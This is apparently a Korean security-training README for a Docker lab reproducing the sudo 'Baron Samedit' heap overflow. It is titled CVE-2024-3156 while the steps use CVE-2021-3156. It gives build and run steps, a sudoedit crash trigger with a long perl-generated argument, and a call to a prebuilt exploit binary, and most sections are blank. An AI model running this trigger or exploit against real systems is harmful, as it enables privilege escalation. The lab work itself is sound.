# CVE-2024-3156
| 화이트햇스쿨 3기 35반 김동욱(7031)
----
### 요약

### 환경 구성
**이미지 빌드**
```bash
docker build -t <image:tag> .
```

**취약한 환경이 구성되었는지 확인**
```bash
$ docker run --rm <image:tag> ./vuln_check
# 아래와 같이 출력되면 취약한 환경이 잘 구성된 것
./vuln_check: line 2:     8 Segmentation fault      sudoedit -s '\' `perl -e 'print "A" x 10000'`
```
### 실행
```bash
$ docker run --rm --it <image:tag>
$ cd CVE-2021-3156 && ./exploit
```
### 결과

### 정리
